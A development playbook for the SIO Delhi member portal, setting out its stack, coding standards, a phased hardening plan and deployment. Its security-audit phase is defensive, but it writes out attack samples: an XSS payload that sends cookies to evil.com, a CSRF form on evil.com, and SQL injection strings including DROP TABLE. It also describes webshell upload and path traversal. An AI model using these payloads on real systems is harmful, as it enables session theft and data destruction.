# SKILL.md — Development Playbook for SIO Delhi Portal

> Production-ready development guide. Covers tech stack decisions, coding standards, phase plan, testing strategy, and deployment.

---

## 1. Tech Stack Assessment

### Current Stack

| Layer | Technology | Verdict |
|-------|-----------|---------|
| Frontend | React 19 + TypeScript 5.9 + Vite 7 | Modern, excellent |
| Styling | TailwindCSS 4 + custom portal CSS tokens | Good — portal uses its own design system |
| State | React Context + hooks | Sufficient for current scale |
| Auth | Clerk (JWT RS256) | Solid, handles phone/email login |
| Backend | PHP (plain, no framework) on cPanel | Functional but fragile — see notes |
| Database | MySQL via phpMyAdmin on shared hosting | Works, but no migration system |
| Deploy | GitHub Pages (frontend) + cPanel (API) | Adequate for current traffic |
| Testing | Vitest + MSW (5 test files) | Infrastructure exists, coverage is near zero |
| CI/CD | GitHub Actions (test + build) | Basic pipeline exists |

### Stack Recommendations

**Keep as-is:**
- React 19 + Vite + TypeScript — excellent, no change needed.
- Clerk — proven auth provider, well integrated.
- TailwindCSS + portal CSS tokens — works well for the dark theme portal.
- Vitest + MSW — correct testing tools, just need more tests.

**Improve (don't replace):**
- **PHP backend**: No framework, which keeps it simple but means no built-in validation, middleware, or ORM. For now, keep PHP but add input validation helpers and structured error responses. Moving to Node/Express would unify the stack but isn't worth the migration cost yet.
- **MySQL migrations**: Currently ad-hoc (`portalSetup()` runs ALTERs). Add a simple numbered migration system (see Phase 2).
- **cPanel deployment**: Works but manual. Add a deploy script that syncs via SSH/FTP (see Phase 16).

**Add:**
- **Playwright** for E2E browser testing — fast, reliable, excellent TypeScript support.
- **Prettier** for consistent formatting.
- **Husky + lint-staged** for pre-commit quality gates.
- **.env.example** (secrets are currently committed — critical fix).
- **Zod** (already installed) for API response validation on frontend.

**Not needed yet:**
- **Prisma/TypeORM**: These are Node.js ORMs. Since the backend is PHP with raw SQL, they don't apply. If the backend moves to Node.js in the future, Prisma would be the choice. For PHP, PDO with prepared statements (already used) is sufficient.
- **Redis/caching**: Traffic doesn't justify it yet.
- **Docker**: cPanel hosting doesn't support containers. Docker is useful for local dev parity but not critical.
- **PWA/offline-first**: Portal requires live data (member records, messages). Offline mode adds complexity with no real benefit for this use case.

---

## 2. What Already Exists (Do Not Recreate)

### Frontend (Complete)
- Full portal routing with role-based guards (`PortalRoutes.tsx`)
- Dashboard with stats cards, retiring members, age bars
- Member CRUD (add individual/CSV, manage table, edit dialog, delete)
- Unit/Circle/Campus CRUD with detail pages
- Member profile view with tabs (info, messages, performance, migrations, permissions)
- Member self-profile with edit + verification flow
- Title assignment system with color tags
- Performance form builder, fill, and response viewer
- Migration request system
- Messaging (compose, inbox, read/unread)
- Notification polling with sidebar badges
- Avatar upload/remove
- CSV bulk import with validation
- Search, filter, sort, pagination across all tables
- Inactive checklist dialog with reason tracking
- Revoke membership with metadata
- Date picker component (DD/MM/YYYY format)

### Backend (Complete)
- All portal REST endpoints (auth, users, units, circles, campuses, regions, messages, performance, migrations, titles, notifications, edit requests, revoke)
- Clerk JWT verification
- Role-based data filtering
- Avatar storage
- CSV field definitions

### Styling (Complete)
- Dark theme design system with CSS custom properties
- All portal component styles
- Responsive layout (sidebar collapse, mobile)

### CI (Partial)
- GitHub Actions workflow (test + build jobs)
- Vitest config with coverage
- MSW mock server setup

---

## 3. Coding Standards

### TypeScript
```
- Strict mode ON (already configured)
- No `any` — use `unknown` and narrow
- No `@ts-ignore` — fix the type instead
- Prefer `interface` over `type` for object shapes
- Use discriminated unions for state (loading | error | success)
- All API responses typed in types.ts
```

### React
```
- Functional components only
- Custom hooks for reusable logic (useX naming)
- Context for cross-cutting state (auth, notifications)
- No prop drilling > 2 levels — use context or composition
- useEffect only for sync with external systems (API, DOM)
- Never store derived state — compute inline or useMemo
- Handle loading, error, empty states in every async component
```

### CSS (Portal)
```
- Use portal design tokens (--p-red, --p-bg-card, --p-border, etc.)
- Class naming: portal-{component}-{modifier}
- No inline styles for reusable patterns — add to portal-components.css
- Inline styles OK for one-off layout (gap, margin adjustments)
- Responsive: test at 320px, 768px, 1024px, 1440px
```

### PHP Backend
```
- PDO prepared statements for ALL queries (no string interpolation)
- JSON responses: { success: true, data: ... } or { success: false, error: "..." }
- Validate all input before use
- Return appropriate HTTP status codes (200, 201, 400, 401, 403, 404, 500)
- Function naming: portalVerbNoun (e.g., portalGetUsers, portalCreateUnit)
- Always check role/permissions before data access
```

### Git
```
- Commit messages: type: description (feat:, fix:, refactor:, test:, docs:, chore:)
- One logical change per commit
- Never commit .env, credentials, or secrets
- Never force push to main
- PR for features > 50 lines changed
```

---

## 4. Phase Plan

Phases are ordered by dependency and impact. Each phase has clear deliverables, files to create/modify, and verification steps.

### Phase 1: Security & Environment Hardening
**Goal:** Fix critical security gaps before adding features.

**Deliverables:**
- [ ] Create `.env.example` with placeholder values (no real secrets)
- [ ] Verify `.env` and `.env.local` are in `.gitignore`
- [ ] Audit all `VITE_` env vars — ensure no secrets leak to frontend bundle
- [ ] Add CSP headers to `api/.htaccess` (Content-Security-Policy, X-Frame-Options)
- [ ] Add rate limiting to login endpoint (`POST /portal/auth/me`)
- [ ] Add input length limits to all PHP endpoints (prevent oversized payloads)
- [ ] Sanitize all user-generated text output (XSS prevention)

**Files:**
- `.env.example` (new)
- `.gitignore` (verify)
- `api/.htaccess` (add security headers)
- `api/routes/portal.php` (input validation)

**Verification:**
- `git log --all --full-history -- .env` shows no secrets in history
- API returns 429 after 10 rapid login attempts
- `<script>alert(1)</script>` in any text field is stored escaped

---

### Phase 2: Database Migration System
**Goal:** Replace ad-hoc ALTERs with trackable numbered migrations.

**Deliverables:**
- [ ] Create `api/migrations/` with numbered SQL files
- [ ] Create `api/migrate.php` runner that tracks applied migrations in a `_migrations` table
- [ ] Extract all existing schema from `portalSetup()` into migration 001
- [ ] Document current schema in `DESIGN/SCHEMA.md`

**Files:**
- `api/migrations/001_initial_schema.sql` (new)
- `api/migrations/002_inactive_fields.sql` (new)
- `api/migrations/003_revoke_fields.sql` (new)
- `api/migrate.php` (new)
- `DESIGN/SCHEMA.md` (new)

**Verification:**
- `php api/migrate.php` applies pending migrations idempotently
- Running twice produces no errors
- `_migrations` table tracks what's been applied

---

### Phase 3: Code Quality Gates
**Goal:** Enforce consistent quality on every commit.

**Deliverables:**
- [ ] Add Prettier config (`.prettierrc`)
- [ ] Add Husky + lint-staged for pre-commit hooks
- [ ] Enable ESLint CI job (currently commented out)
- [ ] Upgrade ESLint rules from `warn` to `error` for critical rules
- [ ] Add `npm run typecheck` script (`tsc --noEmit`)

**Files:**
- `.prettierrc` (new)
- `.husky/pre-commit` (new)
- `package.json` (add husky, lint-staged, format script)
- `.github/workflows/ci.yml` (enable lint job)
- `eslint.config.js` (tighten rules)

**Verification:**
- Committing unformatted code auto-formats it
- Committing code with ESLint errors is blocked
- CI lint job runs and passes

---

### Phase 4: Frontend API Validation
**Goal:** Validate API responses on the frontend to catch backend bugs early.

**Deliverables:**
- [ ] Define Zod schemas for critical API responses (user, unit, message, perf form)
- [ ] Add `safeParse` wrapper to `api.ts` fetch functions
- [ ] Log validation failures in dev, gracefully degrade in prod

**Files:**
- `src/portal/schemas.ts` (new — Zod schemas)
- `src/portal/api.ts` (add validation)

**Verification:**
- Malformed API response logs a warning in console (dev)
- App doesn't crash on unexpected response shapes

---

### Phase 5: Error Handling & Monitoring
**Goal:** Catch and report errors systematically.

**Deliverables:**
- [ ] Add React Error Boundary wrapping portal routes
- [ ] Add global unhandled rejection handler
- [ ] Add structured error logging to PHP API (file-based, rotated daily)
- [ ] Create error report page for admin (`/admin/errors` — optional)

**Files:**
- `src/portal/components/ErrorBoundary.tsx` (new)
- `src/portal/PortalRoutes.tsx` (wrap with boundary)
- `api/logger.php` (new — structured JSON logging)
- `api/routes/portal.php` (add try-catch + logging)

**Verification:**
- Component crash shows "Something went wrong" instead of white screen
- PHP errors logged to `api/logs/error-YYYY-MM-DD.log`

---

### Phase 6: Accessibility Audit
**Goal:** Meet WCAG 2.1 AA for all portal pages.

**Deliverables:**
- [ ] Add `aria-label` to all icon-only buttons
- [ ] Ensure all form inputs have associated labels
- [ ] Add keyboard navigation to dialogs (focus trap, Escape to close)
- [ ] Add `role="alert"` to error/success messages
- [ ] Test with screen reader (VoiceOver/NVDA)
- [ ] Ensure color contrast meets 4.5:1 ratio

**Files:**
- All portal components (audit and fix)
- `src/portal/portal-tokens.css` (adjust colors if needed)

**Verification:**
- Tab through entire app without mouse
- All interactive elements focusable and operable via keyboard
- Lighthouse accessibility score > 90

---

### Phase 7: Unit Test Coverage (Target: 60%)
**Goal:** Cover critical business logic with unit tests.

**Deliverables:**
- [ ] Test all utility functions (csv-utils, constants helpers, date formatting)
- [ ] Test all API client functions with MSW mocks
- [ ] Test React hooks (useNotifications, usePortalAuth)
- [ ] Test key components (DataTable, DateInput, StatusBadge, EditDialog)
- [ ] Test role-based permission logic (`canUser`, `hasPermission`)

**Files:**
- `src/portal/__tests__/api.test.ts` (new)
- `src/portal/__tests__/constants.test.ts` (new)
- `src/portal/__tests__/csv-utils.test.ts` (new)
- `src/portal/__tests__/hooks.test.ts` (new)
- `src/portal/__tests__/components/DataTable.test.tsx` (new)
- `src/portal/__tests__/components/DateInput.test.tsx` (new)

**Verification:**
- `npm run test:coverage` shows > 60% for `src/portal/`
- All tests pass in CI

---

### Phase 8: Playwright E2E Setup
**Goal:** Set up browser-based end-to-end testing infrastructure.

**Deliverables:**
- [ ] Install Playwright (`npm i -D @playwright/test`)
- [ ] Configure `playwright.config.ts` (base URL, projects for Chrome/Firefox/Mobile)
- [ ] Create test fixtures (authenticated user sessions for each role)
- [ ] Create helper utilities (login, navigate, wait for API)
- [ ] Write first smoke test (login → dashboard loads)

**Files:**
- `playwright.config.ts` (new)
- `e2e/fixtures/auth.ts` (new — login helpers)
- `e2e/fixtures/data.ts` (new — test data setup)
- `e2e/smoke.spec.ts` (new)
- `package.json` (add e2e scripts)

**Verification:**
- `npx playwright test` runs and passes smoke test
- Screenshots captured on failure

---

### Phase 9: E2E Test Suite — Core Flows
**Goal:** Cover all critical user journeys with browser tests.

**Deliverables:**
- [ ] Admin: login → dashboard stats correct → add member → verify in manage table → edit → delete
- [ ] Admin: add unit via CSV → verify unit detail page → assign president
- [ ] Member: login → view profile → edit details → submit for verification → see pending status
- [ ] Unit President: login → view members → approve edit request → set inactive with reasons
- [ ] Admin: revoke member → verify hidden from unit president → restore
- [ ] Messaging: compose → send → verify in recipient inbox → read/unread toggle
- [ ] Performance: create form → member fills → leader views responses
- [ ] Migration: member requests → admin approves → member reassigned
- [ ] Mobile viewport: sidebar collapses, tables scroll, forms usable

**Files:**
- `e2e/admin-members.spec.ts`
- `e2e/admin-units.spec.ts`
- `e2e/member-profile.spec.ts`
- `e2e/unit-president.spec.ts`
- `e2e/revoke-flow.spec.ts`
- `e2e/messaging.spec.ts`
- `e2e/performance.spec.ts`
- `e2e/migration.spec.ts`
- `e2e/mobile.spec.ts`

**Verification:**
- All specs pass across Chrome, Firefox, and Mobile Chrome
- CI runs E2E on PR (against staging or local dev server)

---

### Phase 10: Performance Optimization
**Goal:** Fast load times and smooth interactions across the entire site (portal + home page).

**Deliverables:**
- [ ] Code-split portal routes with `React.lazy()` + `Suspense`
- [ ] Lazy-load heavy components (Tiptap editor, charts, Three.js, GSAP animations, Leaflet maps)
- [ ] Add `loading="lazy"` to images
- [ ] Optimize bundle — analyze with `rollup-plugin-visualizer`
- [ ] Add `Cache-Control` headers for static assets in API
- [ ] Database: add indexes on frequently queried columns (phone, unit_id, status, region_id)
- [ ] **Home page**: Lazy-load Three.js scenes (flag waver, 3D elements) — only load when scrolled into view
- [ ] **Home page**: Defer non-critical CSS and fonts (14+ font families currently loaded upfront)
- [ ] **Home page**: Optimize hero images and LUTs (compress, serve WebP/AVIF, use responsive `srcset`)
- [ ] **Home page**: Reduce GSAP/Lenis bundle — tree-shake unused GSAP plugins
- [ ] **Home page**: Preload critical above-the-fold assets, defer everything else
- [ ] Split vendor chunks: separate react, three, gsap, leaflet, tiptap into individual chunks

**Files:**
- `src/portal/PortalRoutes.tsx` (lazy imports)
- `src/App.tsx` or main routes (lazy-load home page sections)
- `src/components/three/` (intersection observer wrapper for 3D scenes)
- `vite.config.ts` (manual chunks, visualizer, asset optimization)
- `api/.htaccess` (cache headers)
- `index.html` (font preload strategy, critical CSS)
- SQL migration for indexes

**Verification:**
- Initial bundle < 500KB (currently 3.7MB — needs splitting)
- Home page Lighthouse performance score > 85
- Portal dashboard loads in < 2s on 3G throttle
- Three.js assets only fetched when user scrolls to that section
- First Contentful Paint < 1.5s on desktop

---

### Phase 11: Backend API Hardening
**Goal:** Make the PHP API robust against edge cases.

**Deliverables:**
- [ ] Add request body size limits (reject > 1MB except uploads)
- [ ] Add CORS configuration (allow only siodelhi.org origins)
- [ ] Add request/response logging for debugging
- [ ] Add health check endpoint (`GET /api/health`)
- [ ] Add API versioning prefix consideration (`/api/v1/portal/...`)
- [ ] Consistent error response format across all endpoints

**Files:**
- `api/index.php` (middleware, health check)
- `api/routes/portal.php` (error handling)
- `api/.htaccess` (CORS, size limits)

**Verification:**
- `GET /api/health` returns `{ status: "ok", db: "connected" }`
- Cross-origin requests from non-allowed domains are rejected
- All error responses follow `{ success: false, error: "message" }` format

---

### Phase 12: Real-Time Features (Optional)
**Goal:** Replace 60-second notification polling with instant updates.

**Deliverables:**
- [ ] Evaluate: Server-Sent Events (SSE) vs WebSocket vs keep polling
- [ ] SSE recommended (simpler, PHP-compatible, one-directional which fits notifications)
- [ ] Add SSE endpoint for notifications
- [ ] Update `NotificationContext` to use EventSource with polling fallback

**Files:**
- `api/routes/portal.php` (SSE endpoint)
- `src/portal/context/NotificationContext.tsx` (EventSource)

**Verification:**
- New message notification appears within 2 seconds (not 60)
- Falls back to polling if SSE connection drops

---

### Phase 13: Documentation
**Goal:** Onboard new developers in < 30 minutes.

**Deliverables:**
- [ ] Rewrite README.md (setup, dev, test, deploy, architecture overview)
- [ ] Document all API endpoints in `DESIGN/API.md` (method, path, auth, request, response)
- [ ] Document database schema in `DESIGN/SCHEMA.md`
- [ ] Add inline JSDoc to exported functions in `api.ts` and `constants.ts`

**Files:**
- `README.md` (rewrite)
- `DESIGN/API.md` (new)
- `DESIGN/SCHEMA.md` (new)

**Verification:**
- New developer can clone, install, and run dev server following README alone
- Every API endpoint documented with example request/response

---

### Phase 14: CI/CD Pipeline Enhancement
**Goal:** Automate quality checks on every PR.

> **Note:** Deployment is done manually (git push + cPanel FTP). This phase focuses on CI quality gates only.

**Deliverables:**
- [ ] CI: lint → typecheck → unit tests → build → E2E tests (sequential)
- [ ] Add test coverage threshold (fail if < 50%)
- [ ] Add bundle size check (fail if > configured limit)

**Files:**
- `.github/workflows/ci.yml` (enhanced)

**Verification:**
- PR with failing tests cannot be merged
- Coverage below threshold fails the build
- Bundle size regression is caught before merge

---

### Phase 15: Security Audit
**Goal:** Verify no vulnerabilities before going fully public.

**Checklist with exploitation scenarios:**

- [ ] **SQL Injection** — all queries use prepared statements
  - *How it's exploited:* Attacker enters `' OR 1=1 --` as a phone number in login or search. If the query uses string concatenation (`"WHERE phone = '$phone'"`) instead of prepared statements (`WHERE phone = ?`), the attacker dumps the entire users table — names, phones, passwords, roles. They could also use `'; DROP TABLE portal_users; --` to destroy data.
  - *What to check:* Search every `.php` file for `$_GET`, `$_POST`, `$_REQUEST` used directly in SQL strings. Every query must use `$pdo->prepare()` with `?` placeholders.

- [ ] **XSS (Cross-Site Scripting)** — all user content HTML-escaped on output
  - *How it's exploited:* Attacker sets their name to `<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>`. When an admin views the member list, the script runs in the admin's browser, stealing their Clerk session token. The attacker now has admin access. Also possible via message body, performance form fields, migration reason text, title names, unit names — any user-editable text rendered in HTML.
  - *What to check:* React's JSX auto-escapes by default (`{variable}`), but `dangerouslySetInnerHTML` bypasses this. Search for `dangerouslySetInnerHTML` and `innerHTML`. On the PHP side, check if any endpoint returns raw user input in HTML responses (API returns JSON, so this is lower risk, but check error pages).

- [ ] **CSRF (Cross-Site Request Forgery)** — Clerk JWT handles this (stateless auth)
  - *How it's exploited:* Attacker sends admin a link to `https://evil.com/attack.html` which contains `<form action="https://api.siodelhi.org/api/portal/users/VICTIM_ID" method="POST"><input name="status" value="inactive"></form><script>document.forms[0].submit()</script>`. If the API uses cookies for auth, the admin's browser automatically sends the cookie, and the member gets set inactive.
  - *Why we're safe:* Clerk JWT is sent via `Authorization: Bearer` header, not cookies. Browsers don't auto-attach custom headers on cross-origin requests. However, verify no endpoint falls back to cookie auth.

- [ ] **Auth Bypass** — every API endpoint checks JWT + role
  - *How it's exploited:* Attacker calls `DELETE /api/portal/users/ADMIN_USER_ID` directly via curl without a token, or with a valid member-role token. If the endpoint doesn't verify the JWT or doesn't check the role, any authenticated user could delete the admin account. Also: attacker modifies their JWT payload to change `role: "member"` to `role: "admin"` — verify the backend validates the JWT signature (RS256) so tampered tokens are rejected.
  - *What to check:* Every route in `api/index.php` must call auth verification. Test each endpoint with: no token (expect 401), member token accessing admin routes (expect 403), tampered token (expect 401).

- [ ] **IDOR (Insecure Direct Object Reference)** — users can only access their own data
  - *How it's exploited:* Member A calls `GET /api/portal/users/MEMBER_B_ID/messages` and reads Member B's private messages. Or calls `PUT /api/portal/users/MEMBER_B_ID` to edit another member's profile. The API accepts any UUID without checking if the caller has permission to access that specific resource.
  - *What to check:* Every endpoint that takes a user ID, unit ID, or message ID must verify the authenticated user has permission to access that specific record (not just that they have the right role, but that the resource belongs to their scope — their unit, their region, etc.).

- [ ] **File Upload** — validate MIME type, limit size, no path traversal
  - *How it's exploited:* Attacker uploads `avatar.php` (a PHP webshell) as their profile photo. If the server saves it to `/uploads/avatars/avatar.php` and the web server executes PHP files in that directory, the attacker now has remote code execution — they can read the database credentials from `.env`, dump the entire database, or install a backdoor. Also: attacker uploads with filename `../../../.env` to overwrite the environment file via path traversal.
  - *What to check:* Validate file extension AND MIME type (not just extension — MIME can be spoofed too, but checking both raises the bar). Save with a generated UUID filename, not the original. Ensure upload directory has no PHP execution (add `php_flag engine off` in `.htaccess` for the uploads folder). Limit file size (2MB for avatars). Strip `../` from filenames.

- [ ] **Sensitive Data Exposure** — no passwords/tokens in logs or responses
  - *How it's exploited:* API response includes `password` field in user objects. Attacker inspects network tab and sees all member passwords. Or: PHP error messages in production show database connection strings, file paths, or stack traces that reveal internal architecture. Or: `.env` committed to git — anyone with repo access (or if repo goes public) gets the Clerk secret key and Supabase credentials.
  - *What to check:* `formatUser()` in `portal.php` must never return `password`. PHP `display_errors` must be `Off` in production. `.env` must be in `.gitignore`. Check git history for accidentally committed secrets (`git log --all -p -- .env`). API error responses must return generic messages, not stack traces.

- [ ] **Broken Access Control (Vertical)** — role hierarchy enforced
  - *How it's exploited:* A unit president calls the "assign title" endpoint with `level: "zonal"` to give themselves a zonal-level title, effectively escalating their privileges. Or a regional president calls the "revoke membership" endpoint (which should be admin/zonal only) to revoke a member in another region.
  - *What to check:* Every "write" endpoint must check the caller's role against the action. The permission check must happen server-side, not just hidden in the UI. Frontend hiding a button is NOT security — the API must independently enforce it.

- [ ] **Dependencies** — `npm audit` shows 0 critical/high vulnerabilities
  - *How it's exploited:* A vulnerable dependency (e.g., outdated version of a JSON parser) has a known CVE that allows remote code execution or prototype pollution. Attacker crafts a malicious payload that exploits the vulnerability through normal API usage.
  - *What to check:* Run `npm audit --production`. Check `composer` dependencies on PHP side if any. Pin dependency versions. Review any dependency with > 1 year since last update.

- [ ] **HTTP Headers** — HSTS, X-Content-Type-Options, X-Frame-Options set
  - *How it's exploited:* Without `X-Frame-Options: DENY`, attacker embeds the portal in an invisible iframe on their site, overlays a fake "Login" button, and tricks the admin into clicking — executing actions in the real portal (clickjacking). Without `X-Content-Type-Options: nosniff`, browser might interpret a JSON response as HTML and execute injected scripts. Without HSTS, attacker on the same network (coffee shop WiFi) can downgrade HTTPS to HTTP and intercept credentials (SSL stripping).
  - *What to check:* Add these headers in `api/.htaccess` or PHP response headers. Test with `curl -I https://api.siodelhi.org/api/health` and verify all security headers present.

- [ ] **Rate Limiting** — prevent brute force and abuse
  - *How it's exploited:* Attacker writes a script that tries 10,000 phone number + password combinations against the login endpoint in 5 minutes. Without rate limiting, they can brute-force any member's default password (first name + last 4 digits of phone — very guessable). Also: attacker floods the messaging endpoint to spam all members, or the migration endpoint to create thousands of fake requests.
  - *What to check:* Implement per-IP rate limiting (e.g., 10 login attempts per minute, 60 API calls per minute). Return `429 Too Many Requests` when exceeded. Consider Clerk's built-in rate limiting for auth endpoints.

**Verification:**
- Manual penetration test of each vector above with curl/Postman
- `npm audit --production` returns 0 critical
- API endpoint without auth returns 401
- Member token cannot access admin endpoints (returns 403)
- File upload with `.php` extension is rejected
- `curl -I` on API shows all security headers

---

### Phase 16: Production Deployment
**Goal:** Reliable, repeatable deployment process.

**Deliverables:**
- [ ] Document deployment steps for frontend (GitHub Pages)
- [ ] Document deployment steps for API (cPanel FTP/SSH)
- [ ] Create `scripts/deploy-frontend.sh` (build + gh-pages push)
- [ ] Create `scripts/deploy-api.sh` (rsync/FTP to cPanel)
- [ ] Add environment-specific configs (dev, staging, prod)
- [ ] Set up database backups (cPanel cron + mysqldump daily)

**Files:**
- `scripts/deploy-frontend.sh` (new)
- `scripts/deploy-api.sh` (new)
- `DESIGN/DEPLOY.md` (new — runbook)

**Verification:**
- Deployment completes in < 5 minutes
- Rollback to previous version possible
- Database backup runs daily and is retained for 30 days

---

### Phase 17: Post-Deployment Verification
**Goal:** Confirm everything works on the live URL.

**Checklist:**
- [ ] Login works for all roles (admin, zonal, regional, unit, member)
- [ ] Dashboard stats load correctly
- [ ] Member CRUD works end-to-end
- [ ] Messaging delivers messages
- [ ] Performance forms create, fill, respond
- [ ] Migrations process correctly
- [ ] Avatar upload works
- [ ] Notifications appear
- [ ] Mobile responsive
- [ ] Lighthouse scores: Performance > 85, Accessibility > 90, Best Practices > 90

**Verification:**
- Run Playwright E2E suite against production URL
- All specs pass
- No console errors in browser

---

## 5. File Naming Conventions

```
src/portal/
  components/     PascalCase.tsx      (DateInput.tsx, StatusBadge.tsx)
  pages/          PascalCase.tsx      (DashboardPage.tsx, ViewMemberPage.tsx)
  hooks/          camelCase.ts        (useNotifications.ts)
  context/        PascalCase.tsx      (PortalAuthContext.tsx)
  __tests__/      camelCase.test.ts   (api.test.ts, constants.test.ts)
  *.ts            camelCase.ts        (api.ts, types.ts, constants.ts)
  *.css           kebab-case.css      (portal-components.css)

api/
  routes/         kebab-case.php      (portal.php)
  migrations/     NNN_description.sql (001_initial_schema.sql)

e2e/
  *.spec.ts       kebab-case.spec.ts  (admin-members.spec.ts)
  fixtures/       camelCase.ts        (auth.ts, data.ts)
```

---

## 6. Common Patterns

### API Call Pattern (Frontend)
```typescript
// In api.ts — consistent error handling
async function apiFetch<T>(path: string, options?: RequestInit): Promise<T> {
  const res = await fetch(`${BASE}${path}`, {
    ...options,
    headers: { ...options?.headers, Authorization: `Bearer ${token}` },
  })
  if (!res.ok) {
    const body = await res.json().catch(() => ({}))
    throw new Error(body.error || `Request failed: ${res.status}`)
  }
  return res.json()
}
```

### PHP Endpoint Pattern
```php
function portalGetSomething($id) {
    // 1. Validate input
    if (!$id) return jsonResponse(400, ['error' => 'ID required']);

    // 2. Check permissions
    $user = getAuthenticatedUser();
    if (!$user) return jsonResponse(401, ['error' => 'Unauthorized']);

    // 3. Query with prepared statement
    $pdo = getDb();
    $stmt = $pdo->prepare('SELECT * FROM portal_table WHERE id = ?');
    $stmt->execute([$id]);
    $row = $stmt->fetch(PDO::FETCH_ASSOC);

    // 4. Return consistent response
    if (!$row) return jsonResponse(404, ['error' => 'Not found']);
    return jsonResponse(200, $row);
}
```

### Dialog Pattern (React)
```typescript
// State in parent
const [showDialog, setShowDialog] = useState(false)

// Dialog component: open/close via prop, onConfirm callback, internal state reset on close
<SomeDialog
  open={showDialog}
  onConfirm={(data) => { handleAction(data); setShowDialog(false) }}
  onCancel={() => setShowDialog(false)}
/>
```

### Date Handling
```
Storage format:  DDMMYYYY (string, e.g., "25031999")
Display format:  DD/MM/YYYY or "25 Mar 1999"
Input:           <DateInput> component (always DD/MM/YYYY with calendar picker)
ISO conversion:  Only for native <input type="date"> internally
```

---

## 7. Quick Reference

### Run locally
```bash
npm install
npm run dev          # Frontend at https://localhost:443
# API runs on https://api.siodelhi.org (proxied by Vite)
```

### Build & verify
```bash
npx tsc --noEmit     # Type check
npm run lint         # ESLint
npm run build        # Production build
npm run test:run     # Unit tests
npx playwright test  # E2E tests (after Phase 8)
```

### Deploy
```bash
npm run build        # Build frontend
# Upload dist/ to GitHub Pages
# Upload api/ to cPanel via FTP/SSH
```
